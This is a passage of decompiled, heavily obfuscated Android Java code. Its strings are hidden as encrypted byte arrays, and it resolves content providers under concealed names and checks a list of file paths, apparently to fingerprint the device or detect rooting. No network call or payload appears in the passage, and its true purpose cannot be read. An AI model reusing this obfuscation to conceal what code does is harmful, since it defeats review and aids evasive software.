                            bArr2[19] = -65;
                            bArr2[20] = -90;
                            bArr2[21] = -107;
                            bArr2[22] = 87;
                            bArr2[23] = 15;
                            bArr2[24] = -61;
                            bArr2[25] = -36;
                            bArr2[26] = -114;
                            bArr2[27] = 13;
                            bArr2[28] = 119;
                            bArr2[29] = -23;
                            bArr2[30] = 61;
                            bArr2[31] = 121;
                            bArr2[32] = 126;
                            bArr2[33] = -85;
                            bArr2[34] = -96;
                            bArr2[35] = 71;
                            bArr2[36] = 88;
                            bArr2[37] = 122;
                            B(bArr2, new byte[]{-102, -49, -104, -43, -83, 79, 29, -82, -121, 82, -51, 16, 18, -65, -56, -113, 50, -80, 71, -42, -43, -31, 121, 92, -90, -82, -8, 100, 20, -116, 109, 11, 17, -35, -55, 35, 61, 8});
                            Charset charset2 = StandardCharsets.UTF_8;
                            resolveContentProvider = packageManager.resolveContentProvider(new String(bArr2, charset2).intern(), z3 ? 1 : 0);
                            PackageManager packageManager2 = context.getPackageManager();
                            byte[] bArr3 = new byte[37];
                            bArr3[z3 ? 1 : 0] = 118;
                            bArr3[1] = -109;
                            bArr3[2] = 7;
                            bArr3[3] = -87;
                            bArr3[4] = -118;
                            bArr3[5] = -98;
                            bArr3[6] = 48;
                            bArr3[7] = -56;
                            bArr3[8] = -98;
                            long j45 = j29 + (j28 | j27);
                            long j46 = j8 + (j7 | j6) + j45;
                            long j47 = (j46 >>> 48) & 21845;
                            long j48 = ((j47 >>> 1) | j47) & 858993459;
                            long j49 = ((j48 >>> 2) | j48) & 252645135;
                            long j50 = (j46 >>> 32) & 21845;
                            long j51 = ((j50 >>> 1) | j50) & 858993459;
                            long j52 = ((j51 >>> 2) | j51) & 252645135;
                            long j53 = ((((j52 >>> 4) | j52) & 16711935) << 16) | ((((j49 >>> 4) | j49) & 16711935) << 24);
                            long j54 = (j46 >>> 16) & 21845;
                            long j55 = ((j54 >>> 1) | j54) & 858993459;
                            long j56 = ((j55 >>> 2) | j55) & 252645135;
                            long j57 = j46 & 21845;
                            long j58 = ((j57 >>> 1) | j57) & 858993459;
                            long j59 = ((j58 >>> 2) | j58) & 252645135;
                            int i4 = z3 ? 1 : 0;
                            int i5 = (((int) ((((j59 >>> 4) | j59) & 16711935) | (((((j56 >>> 4) | j56) & 16711935) << 8) + j53))) | (-1963345881)) & 37767520;
                            long j60 = 142606865;
                            long j61 = (((((((((j60 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j60 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j60 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j60 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j45 + 6148914691236517205L;
                            long j62 = (j61 >>> 48) & 43690;
                            long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
                            long j64 = ((j63 >>> 2) | j63) & 252645135;
                            long j65 = (j61 >>> 32) & 43690;
                            long j66 = ((j65 >>> 2) | (j65 >>> 1)) & 858993459;
                            long j67 = ((j66 >>> 2) | j66) & 252645135;
                            long j68 = ((((j67 >>> 4) | j67) & 16711935) << 16) + ((((j64 >>> 4) | j64) & 16711935) << 24);
                            long j69 = (j61 >>> 16) & 43690;
                            long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
                            long j71 = ((j70 >>> 2) | j70) & 252645135;
                            long j72 = j61 & 43690;
                            long j73 = ((j72 >>> 2) | (j72 >>> 1)) & 858993459;
                            long j74 = ((j73 >>> 2) | j73) & 252645135;
                            int i6 = i5 + ((int) ((((j74 >>> 4) | j74) & 16711935) | ((((j71 >>> 4) | j71) & 16711935) << 8) | j68));
                            try {
                                bArr3[E1.a(180374392 | i6, 180374392, i6)] = 119;
                                bArr3[10] = -67;
                                long j75 = 218365953;
                                long b5 = c3.b((((((((j75 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j75 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j75 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j75 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j45, 6148914691236517205L);
                                long j76 = (b5 >>> 48) & 43690;
                                long j77 = ((j76 >>> 2) | (j76 >>> 1)) & 858993459;
                                long j78 = ((j77 >>> 2) | j77) & 252645135;
                                long j79 = (b5 >>> 32) & 43690;
                                long j80 = ((j79 >>> 2) | (j79 >>> 1)) & 858993459;
                                long j81 = ((j80 >>> 2) | j80) & 252645135;
                                long j82 = ((((j81 >>> 4) | j81) & 16711935) << 16) + ((((j78 >>> 4) | j78) & 16711935) << 24);
                                long j83 = (b5 >>> 16) & 43690;
                                long j84 = ((j83 >>> 2) | (j83 >>> 1)) & 858993459;
                                long j85 = ((j84 >>> 2) | j84) & 252645135;
                                long j86 = b5 & 43690;
                                long j87 = ((j86 >>> 2) | (j86 >>> 1)) & 858993459;
                                long j88 = ((j87 >>> 2) | j87) & 252645135;
                                bArr3[11] = (-1296474448) ^ (1078108432 + ((int) ((((j88 >>> 4) | j88) & 16711935) | (((((j85 >>> 4) | j85) & 16711935) << 8) | j82))));
                                bArr3[12] = 8;
                                bArr3[13] = 24;
                                long j89 = 59824196;
                                long j90 = j7 | (j5 + j4);
                                long j91 = ((((((((j89 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j89 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j89 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j89 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j8 + j90;
                                long j92 = (j91 >>> 48) & 43690;
                                long j93 = ((j92 >>> 2) | (j92 >>> 1)) & 858993459;
                                long j94 = ((j93 >>> 2) | j93) & 252645135;
                                long j95 = (j91 >>> 32) & 43690;
                                long j96 = ((j95 >>> 2) | (j95 >>> 1)) & 858993459;
                                long j97 = ((j96 >>> 2) | j96) & 252645135;
                                long j98 = ((((j97 >>> 4) | j97) & 16711935) << 16) + ((((j94 >>> 4) | j94) & 16711935) << 24);
                                long j99 = (j91 >>> 16) & 43690;
                                long j100 = ((j99 >>> 2) | (j99 >>> 1)) & 858993459;
                                long j101 = ((j100 >>> 2) | j100) & 252645135;
                                long j102 = j91 & 43690;
                                long j103 = ((j102 >>> 2) | (j102 >>> 1)) & 858993459;
                                long j104 = ((j103 >>> 2) | j103) & 252645135;
                                int i7 = (int) ((((j104 >>> 4) | j104) & 16711935) | ((((j101 >>> 4) | j101) & 16711935) << 8) | j98);
                                bArr3[(((i7 & 1413480467) * 2) + (1413480467 ^ i7)) ^ 1473304665] = -18;
                                bArr3[15] = -10;
                                bArr3[16] = -97;
                                bArr3[17] = 6;
                                bArr3[18] = -16;
                                bArr3[19] = 34;
                                bArr3[20] = -13;
                                bArr3[21] = -120;
                                bArr3[22] = 77;
                                bArr3[23] = 69;
                                bArr3[24] = 125;
                                bArr3[25] = -115;
                                bArr3[26] = -121;
                                bArr3[27] = 39;
                                bArr3[28] = 72;
                                bArr3[29] = 119;
                                bArr3[30] = 87;
                                bArr3[31] = 96;
                                long b6 = c3.b(j7, j6, j8, j30);
                                long j105 = (b6 >>> 48) & 21845;
                                long j106 = ((j105 >>> 1) | j105) & 858993459;
                                long j107 = ((j106 >>> 2) | j106) & 252645135;
                                long j108 = (b6 >>> 32) & 21845;
                                long j109 = ((j108 >>> 1) | j108) & 858993459;
                                long j110 = ((j109 >>> 2) | j109) & 252645135;
                                long j111 = ((((j110 >>> 4) | j110) & 16711935) << 16) + ((((j107 >>> 4) | j107) & 16711935) << 24);
                                long j112 = (b6 >>> 16) & 21845;
                                long j113 = ((j112 >>> 1) | j112) & 858993459;
                                long j114 = ((j113 >>> 2) | j113) & 252645135;
                                long j115 = b6 & 21845;
                                long j116 = ((j115 >>> 1) | j115) & 858993459;
                                long j117 = ((j116 >>> 2) | j116) & 252645135;
                                bArr3[32] = (((((int) ((((j117 >>> 4) | j117) & 16711935) + (((((j114 >>> 4) | j114) & 16711935) << 8) | j111))) | (-1809100185)) & 95618114) + 269232164) ^ 364850281;
                                bArr3[33] = 48;
                                bArr3[34] = -80;
                                bArr3[35] = 23;
                                bArr3[36] = -89;
                                byte[] bArr4 = new byte[37];
                                bArr4[i4] = 25;
                                bArr4[1] = -31;
                                bArr4[2] = 96;
                                bArr4[3] = -121;
                                bArr4[4] = -20;
                                bArr4[5] = -20;
                                bArr4[6] = 91;
                                bArr4[7] = -90;
                                bArr4[8] = -11;
                                bArr4[9] = 5;
                                i = i4;
                                try {
                                    int a4 = S.a(i, -1, 335806530, 58812968);
                                    try {
                                        bArr4[(394619491 + a4) - ((a4 & 394619491) * 2)] = -34;
                                        long j118 = -2090808575;
                                        long j119 = (((((((((j118 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j118 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j118 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j118 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (j8 | j90);
                                        long j120 = (j119 >>> 48) & 43690;
                                        long j121 = ((j120 >>> 2) | (j120 >>> 1)) & 858993459;
                                        long j122 = ((j121 >>> 2) | j121) & 252645135;
                                        long j123 = (j119 >>> 32) & 43690;
                                        long j124 = ((j123 >>> 2) | (j123 >>> 1)) & 858993459;
                                        long j125 = ((j124 >>> 2) | j124) & 252645135;
                                        long j126 = ((((j125 >>> 4) | j125) & 16711935) << 16) + ((((j122 >>> 4) | j122) & 16711935) << 24);
                                        long j127 = (j119 >>> 16) & 43690;
                                        long j128 = ((j127 >>> 2) | (j127 >>> 1)) & 858993459;
                                        long j129 = ((j128 >>> 2) | j128) & 252645135;
                                        long j130 = j119 & 43690;
                                        long j131 = ((j130 >>> 2) | (j130 >>> 1)) & 858993459;
                                        long j132 = ((j131 >>> 2) | j131) & 252645135;
                                        int i8 = ((int) ((((j132 >>> 4) | j132) & 16711935) + ((((j129 >>> 4) | j129) & 16711935) << 8) + j126)) + 403181586;
                                        bArr4[11] = B0.a((~i8) | 1687626886, 1687626886 - i8);
                                        bArr4[12] = 60;
                                        bArr4[13] = 54;
                                        bArr4[14] = -122;
                                        bArr4[15] = -101;
                                        bArr4[16] = -2;
                                        bArr4[17] = 89;
                                        bArr4[18] = -97;
                                        bArr4[19] = 81;
                                        bArr4[20] = Byte.MIN_VALUE;
                                        bArr4[21] = -90;
                                        bArr4[22] = 30;
                                        bArr4[23] = 32;
                                        bArr4[24] = 15;
                                        long j133 = 671088778;
                                        long b7 = c3.b((((((((j133 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j133 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j133 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j133 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j29 | j28 | (j26 + j25), 6148914691236517205L);
                                        long j134 = (b7 >>> 48) & 43690;
                                        long j135 = ((j134 >>> 2) | (j134 >>> 1)) & 858993459;
                                        long j136 = (j135 | (j135 >>> 2)) & 252645135;
                                        long j137 = (b7 >>> 32) & 43690;
                                        long j138 = ((j137 >>> 2) | (j137 >>> 1)) & 858993459;
                                        long j139 = ((j138 >>> 2) | j138) & 252645135;
                                        long j140 = ((((j139 >>> 4) | j139) & 16711935) << 16) + (((j136 | (j136 >>> 4)) & 16711935) << 24);
                                        long j141 = (b7 >>> 16) & 43690;
                                        long j142 = ((j141 >>> 2) | (j141 >>> 1)) & 858993459;
                                        long j143 = ((j142 >>> 2) | j142) & 252645135;
                                        long j144 = b7 & 43690;
                                        long j145 = ((j144 >>> 2) | (j144 >>> 1)) & 858993459;
                                        long j146 = (j145 | (j145 >>> 2)) & 252645135;
                                        bArr4[25] = 131005457 ^ ((-802094240) + ((int) (((j146 | (j146 >>> 4)) & 16711935) | (((((j143 >>> 4) | j143) & 16711935) << 8) + j140))));
                                        bArr4[26] = -18;
                                        bArr4[27] = 68;
                                        bArr4[28] = 45;
                                        bArr4[29] = 39;
                                        bArr4[30] = 37;
                                        bArr4[31] = 15;
                                        bArr4[32] = 121;
                                        bArr4[33] = 89;
                                        bArr4[34] = -44;
                                        bArr4[35] = 114;
                                        bArr4[36] = -43;
                                        B(bArr3, bArr4);
                                        r12 = 0;
                                        resolveContentProvider2 = packageManager2.resolveContentProvider(new String(bArr3, charset2).intern(), 0);
                                    } catch (Exception e5) {
                                        e4 = e5;
                                        i = 0;
                                        c4 = 27927;
                                        providerInfo2 = providerInfo;
                                        r12 = i;
                                        z3 = r12;
                                    }
                                } catch (Exception e6) {
                                    e4 = e6;
                                }
                            } catch (Exception e7) {
                                e4 = e7;
                                i = i4;
                            }
                        } catch (Exception e8) {
                            e4 = e8;
                            i = z3 ? 1 : 0;
                        }
                        if (resolveContentProvider == null) {
                            c4 = 31844;
                            providerInfo2 = resolveContentProvider2;
                            e4 = resolveContentProvider;
                            z3 = r12;
                        } else {
                            providerInfo2 = resolveContentProvider2;
                            e4 = resolveContentProvider;
                            z3 = false;
                        }
                    case 21300:
                        try {
                            byte[] bArr5 = {90, -85, -121, -65, 108, -44, 55, 0, -68, -109, 12, -72, -53, -4, Byte.MIN_VALUE, -90, -70};
                            byte[] bArr6 = new byte[17];
                            bArr6[z3 ? 1 : 0] = 60;
                            bArr6[1] = -62;
                            bArr6[2] = -23;
                            bArr6[3] = -37;
                            bArr6[4] = 36;
                            bArr6[5] = -103;
                            bArr6[6] = 118;
                            bArr6[7] = 66;
                            long j147 = 118103990;
                            long j148 = -1;
                            long j149 = ((((((((j148 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j148 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845);
                            long j150 = (((((((j148 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                            long j151 = (((((((j148 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                            long j152 = j151 | (j150 + j149);
                            long j153 = (((((((((j147 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j147 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j147 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j147 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j152 + 6148914691236517205L;
                            long j154 = (j153 >>> 48) & 43690;
                            long j155 = ((j154 >>> 2) | (j154 >>> 1)) & 858993459;
                            long j156 = ((j155 >>> 2) | j155) & 252645135;
                            long j157 = (j153 >>> 32) & 43690;
                            long j158 = ((j157 >>> 2) | (j157 >>> 1)) & 858993459;
                            long j159 = ((j158 >>> 2) | j158) & 252645135;
                            long j160 = ((((j159 >>> 4) | j159) & 16711935) << 16) + ((((j156 >>> 4) | j156) & 16711935) << 24);
                            long j161 = (j153 >>> 16) & 43690;
                            long j162 = ((j161 >>> 2) | (j161 >>> 1)) & 858993459;
                            long j163 = ((j162 >>> 2) | j162) & 252645135;
                            long j164 = j153 & 43690;
                            long j165 = ((j164 >>> 2) | (j164 >>> 1)) & 858993459;
                            long j166 = ((j165 >>> 2) | j165) & 252645135;
                            int i9 = (int) ((((j166 >>> 4) | j166) & 16711935) | ((((j163 >>> 4) | j163) & 16711935) << 8) | j160);
                            long j167 = -1333788173;
                            long j168 = i9;
                            long j169 = (((((((((j167 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j167 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j167 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j167 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (((((((((j168 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j168 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j168 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j168 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                            long j170 = (j169 >>> 48) & 43690;
                            long j171 = ((j170 >>> 2) | (j170 >>> 1)) & 858993459;
                            long j172 = ((j171 >>> 2) | j171) & 252645135;
                            long j173 = (j169 >>> 32) & 43690;
                            long j174 = ((j173 >>> 2) | (j173 >>> 1)) & 858993459;
                            long j175 = ((j174 >>> 2) | j174) & 252645135;
                            long j176 = ((((j175 >>> 4) | j175) & 16711935) << 16) | ((((j172 >>> 4) | j172) & 16711935) << 24);
                            long j177 = (j169 >>> 16) & 43690;
                            long j178 = ((j177 >>> 2) | (j177 >>> 1)) & 858993459;
                            long j179 = ((j178 >>> 2) | j178) & 252645135;
                            long j180 = j169 & 43690;
                            long j181 = ((j180 >>> 2) | (j180 >>> 1)) & 858993459;
                            long j182 = ((j181 >>> 2) | j181) & 252645135;
                            bArr6[8] = (((int) ((((((j179 >>> 4) | j179) & 16711935) << 8) | j176) | (((j182 >>> 4) | j182) & 16711935))) + 1094725640) ^ 239062590;
                            bArr6[9] = -61;
                            long j183 = 772186486;
                            long b8 = c3.b((((((((j183 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j183 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j183 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j183 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j152, 6148914691236517205L);
                            long j184 = (b8 >>> 48) & 43690;
                            long j185 = ((j184 >>> 2) | (j184 >>> 1)) & 858993459;
                            long j186 = ((j185 >>> 2) | j185) & 252645135;
                            long j187 = (b8 >>> 32) & 43690;
                            long j188 = ((j187 >>> 2) | (j187 >>> 1)) & 858993459;
                            long j189 = ((j188 >>> 2) | j188) & 252645135;
                            long j190 = ((((j189 >>> 4) | j189) & 16711935) << 16) + ((((j186 >>> 4) | j186) & 16711935) << 24);
                            long j191 = (b8 >>> 16) & 43690;
                            long j192 = ((j191 >>> 2) | (j191 >>> 1)) & 858993459;
                            long j193 = ((j192 >>> 2) | j192) & 252645135;
                            long j194 = b8 & 43690;
                            long j195 = ((j194 >>> 2) | (j194 >>> 1)) & 858993459;
                            long j196 = ((j195 >>> 2) | j195) & 252645135;
                            bArr6[((((int) ((((j196 >>> 4) | j196) & 16711935) + (((((j193 >>> 4) | j193) & 16711935) << 8) + j190))) & (-1588007930)) + 1174863872) ^ (-413144052)] = 126;
                            bArr6[11] = -41;
                            bArr6[12] = -67;
                            bArr6[13] = -107;
                            bArr6[14] = -28;
                            bArr6[15] = -61;
                            bArr6[16] = -56;
                            B(bArr5, bArr6);
                            charset = StandardCharsets.UTF_8;
                            intern = new String(bArr5, charset).intern();
                            bArr = new byte[]{-53, 78, -2, -92};
                            long j197 = -1593665420;
                            long j198 = (((((((((j197 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j197 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j197 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j197 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j151 + (j150 | j149) + 6148914691236517205L;
                            long j199 = (j198 >>> 48) & 43690;
                            long j200 = ((j199 >>> 2) | (j199 >>> 1)) & 858993459;
                            long j201 = ((j200 >>> 2) | j200) & 252645135;
                            long j202 = (j198 >>> 32) & 43690;
                            long j203 = ((j202 >>> 2) | (j202 >>> 1)) & 858993459;
                            long j204 = ((j203 >>> 2) | j203) & 252645135;
                            long j205 = ((((j204 >>> 4) | j204) & 16711935) << 16) | ((((j201 >>> 4) | j201) & 16711935) << 24);
                            long j206 = (j198 >>> 16) & 43690;
                            long j207 = ((j206 >>> 2) | (j206 >>> 1)) & 858993459;
                            long j208 = ((j207 >>> 2) | j207) & 252645135;
                            long j209 = j198 & 43690;
                            long j210 = ((j209 >>> 2) | (j209 >>> 1)) & 858993459;
                            long j211 = (j210 | (j210 >>> 2)) & 252645135;
                            byte b9 = ((((int) (((j211 | (j211 >>> 4)) & 16711935) | (((((j208 >>> 4) | j208) & 16711935) << 8) + j205))) | 2116220347) - 1845675449) ^ 1845675469;
                            byte[] bArr7 = new byte[8];
                            bArr7[z3 ? 1 : 0] = -65;
                            bArr7[1] = 60;
                            bArr7[2] = b9;
                            bArr7[3] = -63;
                            bArr7[4] = 91;
                            bArr7[5] = -75;
                            bArr7[6] = 89;
                            bArr7[7] = -94;
                            B(bArr, bArr7);
                        } catch (Exception e9) {
                            e4 = e9;
                        }
                        try {
                            t(intern, new String(bArr, charset).intern());
                            c4 = 21183;
                            z4 = true;
                        } catch (Exception e10) {
                            e4 = e10;
                            i = z3 ? 1 : 0;
                            providerInfo = providerInfo2;
                            c4 = 27927;
                            providerInfo2 = providerInfo;
                            r12 = i;
                            z3 = r12;
                        }
                    case 27927:
                        e4 = (Exception) e4;
                        c4 = 29961;
                    case 29961:
                        return z3;
                    case 58820:
                        c4 = 29961;
                    case 31844:
                        c4 = providerInfo2 != null ? (char) 21300 : (char) 58820;
                    case 21183:
                        return z4;
                }
            }
        }
    }

    public final boolean M(String str) {
        for (String str2 : V.f393d) {
            if (new File(AbstractC0008a.n(str2, str)).exists()) {
                long j2 = -52033144;
                long j3 = -1;
                long b4 = c3.b((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))), 6148914691236517205L);
                long j4 = (b4 >>> 48) & 43690;
                long j5 = ((j4 >>> 2) | (j4 >>> 1)) & 858993459;
                long j6 = ((j5 >>> 2) | j5) & 252645135;
                long j7 = (b4 >>> 32) & 43690;
                long j8 = ((j7 >>> 2) | (j7 >>> 1)) & 858993459;
                long j9 = ((j8 >>> 2) | j8) & 252645135;
                long j10 = ((((j9 >>> 4) | j9) & 16711935) << 16) | ((((j6 >>> 4) | j6) & 16711935) << 24);
                long j11 = (b4 >>> 16) & 43690;
                long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
                long j13 = ((j12 >>> 2) | j12) & 252645135;
                long j14 = b4 & 43690;
                long j15 = ((j14 >>> 2) | (j14 >>> 1)) & 858993459;
                long j16 = (j15 | (j15 >>> 2)) & 252645135;
                int i = (int) (((j16 | (j16 >>> 4)) & 16711935) + ((((j13 >>> 4) | j13) & 16711935) << 8) + j10);
                byte[] bArr = {-50, -5, 95, 45, 59, 97, 65, 42, -94, 39, (-488753824) ^ (((i + 404818440) - (i | 404818440)) + 83935360), 0, -63, -84, 40, -77, -45, 41};
                long j17 = 1686111112;
                long j18 = 0;
                long j19 = (((((((((j17 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j17 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j17 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j17 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j20 = (j19 >>> 48) & 43690;
                long j21 = ((j20 >>> 2) | (j20 >>> 1)) & 858993459;
                long j22 = (j21 | (j21 >>> 2)) & 252645135;
                long j23 = (j19 >>> 32) & 43690;
                long j24 = ((j23 >>> 2) | (j23 >>> 1)) & 858993459;
                long j25 = (j24 | (j24 >>> 2)) & 252645135;
                long j26 = (((j22 | (j22 >>> 4)) & 16711935) << 24) | (((j25 | (j25 >>> 4)) & 16711935) << 16);
                long j27 = (j19 >>> 16) & 43690;
                long j28 = ((j27 >>> 2) | (j27 >>> 1)) & 858993459;
                long j29 = (j28 | (j28 >>> 2)) & 252645135;
                long j30 = j19 & 43690;
                long j31 = ((j30 >>> 2) | (j30 >>> 1)) & 858993459;
                long j32 = (j31 | (j31 >>> 2)) & 252645135;
                z(bArr, new byte[]{-53, -101, -120, -119, 54, 61, -110, -2, -81, 116, (-56491119) ^ ((-1532886248) + (((int) (((j32 | (j32 >>> 4)) & 16711935) | ((((j29 | (j29 >>> 4)) & 16711935) << 8) + j26))) | 1476395140)), -78, -41, -1, -51, 116, -67, 93});
                t(new String(bArr, StandardCharsets.UTF_8).intern(), str2 + str);
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x005a. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0 */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v10, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v14 */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v18 */
    /* JADX WARN: Type inference failed for: r0v19 */
    /* JADX WARN: Type inference failed for: r0v20 */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r0v6 */
    /* JADX WARN: Type inference failed for: r5v29, types: [android.net.Uri$Builder] */
    /* JADX WARN: Type inference failed for: r62v1, types: [boolean] */
    public final boolean N(Context context) {
        IntentFilter intentFilter;
        int i;
        int i3;
        String str = 0;
        int i4 = 0;
        Iterator<ResolveInfo> it = null;
        Iterator<IntentFilter.AuthorityEntry> it2 = null;
        boolean z3 = false;
        char c4 = 54366;
        IntentFilter intentFilter2 = null;
        while (true) {
            switch (c4) {
                case 45378:
                    int i5 = i4;
                    intentFilter = intentFilter2;
                    byte[] bArr = new byte[23];
                    bArr[i5] = -69;
                    bArr[1] = -44;
                    long j2 = 319129772;
                    long j3 = -1;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j7 = j6 | j5 | j4;
